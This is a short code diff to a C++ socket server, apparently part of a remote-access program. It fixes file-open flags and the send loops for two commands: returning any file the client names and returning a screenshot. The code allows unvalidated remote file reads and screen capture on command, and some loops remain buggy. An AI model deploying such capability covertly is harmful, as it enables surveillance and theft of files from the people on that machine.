@@ -31,14 +31,14 @@ void ServerSocket::ProcessClientMessage() {
 			fileName += buffer[index];
 			index++;
 		}
-		fstream file(fileName, ios::binary || ios::in);
+		fstream file(fileName, ios::binary | ios::in);
 		file.seekg(0, ios::end);
 		size_t fileSize = file.tellg();
 		file.seekg(0, ios::beg);
 		result = "F" + to_string(fileSize);
 		Send();
 		char fileBuffer[maxBufferSize];
-		while (file) {
+		while (file.good()) {
 			file.read(buffer, sizeof(buffer));
 			send(clientSocket, buffer, sizeof(buffer), 0);
 		}
@@ -68,16 +68,21 @@ void ServerSocket::ProcessClientMessage() {
 	}
 	else if (query == 22) {
 		if (CaptureScreen()) {
-			fstream file("_Data/screenshot.jpg", ios::binary || ios::in);
+			fstream file("_Data/screenshot.jpg", ios::binary | ios::in);
 			file.seekg(0, ios::end);
 			size_t fileSize = file.tellg();
 			file.seekg(0, ios::beg);
 			result = "F" + to_string(fileSize);
 			Send();
 			char fileBuffer[maxBufferSize];
-			while (file) {
-				file.read(buffer, sizeof(buffer));
-				send(clientSocket, buffer, sizeof(buffer), 0);
+			while (fileSize > 0 && fileSize >= maxBufferSize) {
+				file.read(buffer, maxBufferSize);
+				send(clientSocket, buffer, maxBufferSize, 0);
+				fileSize -= maxBufferSize;
+			}
+			if (fileSize > 0) {
+				file.read(buffer, fileSize);
+				send(clientSocket, buffer, fileSize, 0);
 			}
 		}
 		else {
